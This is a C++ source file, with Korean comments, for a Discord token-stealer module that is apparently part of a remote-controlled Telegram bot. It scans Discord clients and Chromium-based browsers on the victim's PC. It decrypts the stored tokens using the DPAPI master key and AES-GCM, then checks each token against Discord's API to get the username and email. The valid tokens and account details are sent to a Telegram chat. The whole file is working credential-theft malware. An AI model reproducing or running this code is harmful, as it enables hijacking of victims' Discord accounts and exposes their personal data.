// Command_Storage.cpp (항목별 개수 로깅 추가 최종본)

// --- C++ 표준 라이브러리 ---
#include <string>
#include <vector>
#include <map>
#include <set>
#include <sstream>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <regex>

// --- Windows API 헤더 ---
#define NOMINMAX
#include <windows.h>
#include <shlobj.h>
#include <dpapi.h>
#include <bcrypt.h>
#include <winhttp.h>

// --- 콘솔 설정 헤더 ---
#include <io.h>
#include <fcntl.h>

// --- 프로젝트 의존 헤더 ---
#include "Commands.h"
#include "TelegramApi.h"
#include "Config.h"
#include "json.hpp"

// --- 라이브러리 링크 ---
#pragma comment(lib, "Bcrypt.lib")
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Winhttp.lib")

using json = nlohmann::json;

// --- 타입 정의 ---
struct ValidatedToken {
    std::wstring token;
    std::wstring username;
    std::wstring email;
};
using ValidatedTokenMap = std::map<std::wstring, std::vector<ValidatedToken>>;
using DiscoveredTokenMap = std::map<std::wstring, std::set<std::wstring>>;
using byte = unsigned char;

// =================================================================
// ✨ 1. 헬퍼 및 콘솔 설정 함수
// =================================================================

void SetupConsole() {
    if (AllocConsole()) {
        FILE* pFile;
        freopen_s(&pFile, "CONOUT$", "w", stdout);
        _setmode(_fileno(stdout), _O_U16TEXT);
        std::wcout.imbue(std::locale(""));
    }
}

static std::wstring Utf8ToWide(const std::string& s) {
    if (s.empty()) return L"";
    int n = MultiByteToWideChar(CP_UTF8, 0, s.data(), (int)s.size(), nullptr, 0);
    if (n <= 0) return L"";
    std::wstring w(n, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, s.data(), (int)s.size(), &w[0], n);
    return w;
}

static std::string WToUtf8(const std::wstring& s) {
    if (s.empty()) return "";
    int n = WideCharToMultiByte(CP_UTF8, 0, s.data(), (int)s.size(), nullptr, 0, nullptr, nullptr);
    if (n <= 0) return "";
    std::string u(n, '\0');
    WideCharToMultiByte(CP_UTF8, 0, s.data(), (int)s.size(), &u[0], n, nullptr, nullptr);
    return u;
}

static std::wstring RenderResults(const ValidatedTokenMap& byTag) {
    std::wstringstream ws;
    ws << L"✨ 유효 토큰 스캔 결과 ✨\n";
    ws << L"-----------------------------------\n\n";
    bool found = false;
    for (const auto& pair : byTag) {
        if (pair.second.empty()) continue;
        found = true;
        ws << L"📁 " << pair.first << L"\n";
        for (const auto& info : pair.second) {
            ws << L"- 토큰: `" << info.token << L"`\n";
            ws << L"- 유저: `" << info.username << L"`\n";
            ws << L"- 이메일: `" << info.email << L"`\n";
            ws << L"------------------\n";
        }
        ws << L"\n";
    }
    if (!found) {
        return L"❌ 유효한 토큰을 찾지 못했습니다.";
    }
    return ws.str();
}

// =================================================================
// ✨ 2. 토큰 유효성 검사 및 정보 추출
// =================================================================

bool CheckTokenAndGetInfo(const std::wstring& token, ValidatedToken& outInfo) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    bool success = false;

    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    WinHttpSetTimeouts(hSession, 10000, 10000, 10000, 10000);

    hConnect = WinHttpConnect(hSession, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/api/v9/users/@me", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    std::wstring authHeader = L"Authorization: " + token;
    WinHttpAddRequestHeaders(hRequest, authHeader.c_str(), (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);

    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        if (WinHttpReceiveResponse(hRequest, NULL)) {
            DWORD dwStatusCode = 0;
            DWORD dwSize = sizeof(dwStatusCode);
            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &dwStatusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);

            if (dwStatusCode == 200) {
                std::string responseBody;
                DWORD bytesRead = 0;
                do {
                    char buffer[4096];
                    if (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                        responseBody.append(buffer, bytesRead);
                    }
                } while (bytesRead > 0);

                try {
                    json data = json::parse(responseBody);
                    std::string username = data.value("username", "");
                    std::string discriminator = data.value("discriminator", "");
                    outInfo.token = token;
                    outInfo.username = Utf8ToWide(username + "#" + discriminator);
                    outInfo.email = Utf8ToWide(data.value("email", "N/A"));
                    success = true;
                }
                catch (...) { /* JSON 파싱 실패 */ }
            }
        }
    }

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return success;
}

// =================================================================
// ✨ 3. 데이터 처리 및 복호화 로직
// =================================================================

bool DecryptDPAPI(const std::vector<byte>& encryptedData, std::vector<byte>& decryptedData) {
    DATA_BLOB input;
    DATA_BLOB output;
    input.pbData = const_cast<byte*>(encryptedData.data());
    input.cbData = static_cast<DWORD>(encryptedData.size());
    if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
        decryptedData.assign(output.pbData, output.pbData + output.cbData);
        LocalFree(output.pbData);
        return true;
    }
    return false;
}

bool Base64Decode(const std::string& input, std::vector<byte>& output) {
    DWORD outLen = 0;
    if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, NULL, &outLen, NULL, NULL)) return false;
    output.resize(outLen);
    return CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, output.data(), &outLen, NULL, NULL);
}

std::vector<byte> DecryptToken(const std::vector<byte>& buffer, const std::vector<byte>& masterKey) {
    if (buffer.size() <= 15 + 16) return {};
    try {
        std::vector<byte> iv(buffer.begin() + 3, buffer.begin() + 15);
        std::vector<byte> payload(buffer.begin() + 15, buffer.end());
        std::vector<byte> tag(payload.end() - 16, payload.end());
        std::vector<byte> ciphertext(payload.begin(), payload.end() - 16);

        BCRYPT_ALG_HANDLE hAlg;
        BCRYPT_KEY_HANDLE hKey;
        std::vector<byte> decryptedData;

        if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) return {};
        if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0))) {
            BCryptCloseAlgorithmProvider(hAlg, 0); return {};
        }
        if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PBYTE)masterKey.data(), (ULONG)masterKey.size(), 0))) {
            BCryptCloseAlgorithmProvider(hAlg, 0); return {};
        }

        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
        memset(&authInfo, 0, sizeof(authInfo));
        authInfo.cbSize = sizeof(authInfo);
        authInfo.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
        authInfo.pbNonce = iv.data();
        authInfo.cbNonce = (ULONG)iv.size();
        authInfo.pbTag = tag.data();
        authInfo.cbTag = (ULONG)tag.size();

        ULONG decryptedLen = 0;
        decryptedData.resize(ciphertext.size());

        NTSTATUS status = BCryptDecrypt(hKey, (PBYTE)ciphertext.data(), (ULONG)ciphertext.size(), &authInfo, NULL, 0, decryptedData.data(), (ULONG)decryptedData.size(), &decryptedLen, 0);

        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);

        if (BCRYPT_SUCCESS(status)) {
            decryptedData.resize(decryptedLen);
            return decryptedData;
        }
    }
    catch (...) {}
    return {};
}

void ProcessEncryptedTarget(const std::wstring& targetName, const std::wstring& basePath, DiscoveredTokenMap& results) {
    if (!std::filesystem::exists(basePath)) return;
    std::wstring localStatePath = basePath + L"\\Local State";
    std::wstring leveldbPath = basePath + L"\\Local Storage\\leveldb";
    if (!std::filesystem::exists(localStatePath) || !std::filesystem::exists(leveldbPath)) return;

    std::vector<byte> masterKey;
    try {
        std::ifstream ifs_ls(localStatePath);
        if (!ifs_ls.is_open()) return;
        json state = json::parse(ifs_ls);
        std::string encryptedKeyB64 = state["os_crypt"]["encrypted_key"];
        std::vector<byte> encryptedKeyWithPrefix;
        if (!Base64Decode(encryptedKeyB64, encryptedKeyWithPrefix)) return;
        std::vector<byte> encryptedKey(encryptedKeyWithPrefix.begin() + 5, encryptedKeyWithPrefix.end());
        if (!DecryptDPAPI(encryptedKey, masterKey) || masterKey.empty()) return;
    }
    catch (...) { return; }

    const std::wregex encTokenRegex(L"dQw4w9WgXcQ:([^\"]*)");
    try {
        for (const auto& entry : std::filesystem::directory_iterator(leveldbPath)) {
            if (entry.path().extension() == L".log" || entry.path().extension() == L".ldb") {
                std::ifstream ifs_db(entry.path(), std::ios::binary);
                if (!ifs_db) continue;
                std::string content((std::istreambuf_iterator<char>(ifs_db)), std::istreambuf_iterator<char>());
                std::wstring wide_content = Utf8ToWide(content);
                auto it = std::wsregex_iterator(wide_content.begin(), wide_content.end(), encTokenRegex);
                auto end = std::wsregex_iterator();
                for (; it != end; ++it) {
                    if (it->size() > 1) {
                        std::wstring encoded_token = it->str(1);
                        std::vector<byte> decoded_bytes;
                        if (Base64Decode(WToUtf8(encoded_token), decoded_bytes)) {
                            std::vector<byte> decrypted_token_bytes = DecryptToken(decoded_bytes, masterKey);
                            if (!decrypted_token_bytes.empty()) {
                                std::string token_str(decrypted_token_bytes.begin(), decrypted_token_bytes.end());
                                if (std::regex_match(token_str, std::regex("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}"))) {
                                    results[targetName].insert(Utf8ToWide(token_str));
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    catch (...) {}
}

void ProcessSimpleTarget(const std::wstring& targetName, const std::wstring& leveldbPath, DiscoveredTokenMap& results) {
    if (!std::filesystem::exists(leveldbPath)) return;
    const std::regex tokenRegex("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}");
    try {
        for (const auto& entry : std::filesystem::directory_iterator(leveldbPath)) {
            if (entry.path().extension() == L".log" || entry.path().extension() == L".ldb") {
                std::ifstream ifs_db(entry.path(), std::ios::binary);
                if (!ifs_db) continue;
                std::string content((std::istreambuf_iterator<char>(ifs_db)), std::istreambuf_iterator<char>());
                auto it = std::sregex_iterator(content.begin(), content.end(), tokenRegex);
                auto end = std::sregex_iterator();
                for (; it != end; ++it) {
                    results[targetName].insert(Utf8ToWide(it->str()));
                }
            }
        }
    }
    catch (...) {}
}

// =================================================================
// ✨ 4. 스캔 경로 정의 및 실행
// =================================================================

struct TargetPath {
    std::wstring name;
    std::wstring basePath;
    std::wstring leveldbPath;
    bool isEncrypted;
};

std::vector<TargetPath> GetKnownPaths() {
    wchar_t roamingPath[MAX_PATH] = { 0 };
    wchar_t localPath[MAX_PATH] = { 0 };
    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, roamingPath);
    SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localPath);
    std::wstring r = roamingPath;
    std::wstring l = localPath;

    return {
        {L"Discord", r + L"\\discord", r + L"\\discord\\Local Storage\\leveldb", true},
        {L"Discord Canary", r + L"\\discordcanary", r + L"\\discordcanary\\Local Storage\\leveldb", true},
        {L"Discord PTB", r + L"\\discordptb", r + L"\\discordptb\\Local Storage\\leveldb", true},
        {L"Lightcord", r + L"\\Lightcord", r + L"\\Lightcord\\Local Storage\\leveldb", true},
        {L"Chrome", l + L"\\Google\\Chrome\\User Data", l + L"\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb", false},
        {L"Edge", l + L"\\Microsoft\\Edge\\User Data", l + L"\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb", false},
        {L"Brave", l + L"\\BraveSoftware\\Brave-Browser\\User Data", l + L"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb", false},
        {L"Opera", r + L"\\Opera Software\\Opera Stable", r + L"\\Opera Software\\Opera Stable\\Local Storage\\leveldb", false},
        {L"Opera GX", r + L"\\Opera Software\\Opera GX Stable", r + L"\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb", false},
        {L"Vivaldi", l + L"\\Vivaldi\\User Data", l + L"\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb", false},
        {L"Yandex", l + L"\\Yandex\\YandexBrowser\\User Data", l + L"\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb", false},
        {L"Chrome P1", l + L"\\Google\\Chrome\\User Data", l + L"\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb", false},
        {L"Chrome P2", l + L"\\Google\\Chrome\\User Data", l + L"\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb", false},
        {L"Chrome P3", l + L"\\Google\\Chrome\\User Data", l + L"\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb", false},
    };
}

void ScanForTokens(DiscoveredTokenMap& results) {
    auto targets = GetKnownPaths();
    for (const auto& target : targets) {
        if (target.isEncrypted) {
            ProcessEncryptedTarget(target.name, target.basePath, results);
        }
        else {
            ProcessSimpleTarget(target.name, target.leveldbPath, results);
        }
    }
}

// =================================================================
// ✨ 5. 최종 핸들러 및 자동 등록
// =================================================================

static bool StorageHandler(long long chatId, const std::string& hwid8, const std::string& argsUtf8) {
    SetupConsole();
    SendText(chatId, WToUtf8(L"🔍 PC 파일 스캔을 시작합니다..."));
    std::wcout << L"\n\n===============================================\n";
    std::wcout << L"[HANDLER] 'storage' command received. Starting local file scan...\n";
    std::wcout << L"===============================================\n";

    DiscoveredTokenMap discoveredTokens;
    ScanForTokens(discoveredTokens);

    // 🚀🚀🚀 [수정/추가된 부분] 🚀🚀🚀
    std::wcout << L"[SCAN] File scan finished. Found token counts per source:\n";
    std::wcout << L"-----------------------------------------------\n";
    bool anyTokenFound = false;
    for (const auto& pair : discoveredTokens) {
        if (!pair.second.empty()) {
            anyTokenFound = true;
            std::wcout << L"- " << pair.first << L": " << pair.second.size() << L" token(s) found.\n";
        }
    }
    if (!anyTokenFound) {
        std::wcout << L"- No tokens found in any location.\n";
    }
    std::wcout << L"-----------------------------------------------\n";

    std::set<std::wstring> uniqueTokens;
    for (const auto& pair : discoveredTokens) {
        for (const auto& token : pair.second) {
            uniqueTokens.insert(token);
        }
    }

    int totalFound = uniqueTokens.size();
    if (totalFound == 0) {
        SendText(chatId, WToUtf8(L"✅ 스캔 완료. 토큰을 찾지 못했습니다."));
        std::wcout << L"[HANDLER] Scan finished. No tokens found.\n";
        return true;
    }

    std::wstring preCheckMsg = L"✅ 스캔 완료! 총 " + std::to_wstring(totalFound) + L"개의 고유 토큰을 발견했습니다.\n"
        L"지금부터 온라인 유효성 검사를 시작합니다...";
    SendText(chatId, WToUtf8(preCheckMsg));
    std::wcout << L"\n[VALIDATE] Starting online validation for " << totalFound << L" unique tokens...\n";
    std::wcout << L"-----------------------------------------------\n";

    ValidatedTokenMap validatedResults;
    std::map<std::wstring, ValidatedToken> validTokenCache;

    int validatedCount = 0;
    for (const auto& token : uniqueTokens) {
        validatedCount++;
        std::wcout << L"[" << validatedCount << L"/" << totalFound << L"] Checking " << token.substr(0, 26) << L"..." << std::flush;

        ValidatedToken info;
        if (CheckTokenAndGetInfo(token, info)) {
            std::wcout << L" -> VALID ✅\n";
            validTokenCache[token] = info;
        }
        else {
            std::wcout << L" -> INVALID ❌\n";
        }
    }

    for (const auto& pair : discoveredTokens) {
        const std::wstring& sourceName = pair.first;
        for (const auto& token : pair.second) {
            // .count()를 사용하여 키 존재 여부 확인
            if (validTokenCache.count(token)) {
                // 이미 validatedResults[sourceName]에 동일 토큰이 있는지 확인하여 중복 추가 방지
                bool already_added = false;
                for (const auto& validated : validatedResults[sourceName]) {
                    if (validated.token == token) {
                        already_added = true;
                        break;
                    }
                }
                if (!already_added) {
                    validatedResults[sourceName].push_back(validTokenCache[token]);
                }
            }
        }
    }

    std::wstring msg = RenderResults(validatedResults);
    SendText(chatId, WToUtf8(L"✅ 유효성 검사 완료! 최종 결과를 전송합니다."));
    SendText(chatId, WToUtf8(msg));

    std::wcout << L"[HANDLER] Finished. Results sent to Telegram.\n";
    std::wcout << L"===============================================\n";

    return true;
}

struct StorageRegistrar {
    StorageRegistrar() {
        RegisterCommand("storage", &StorageHandler);
    }
} g_storage_registrar;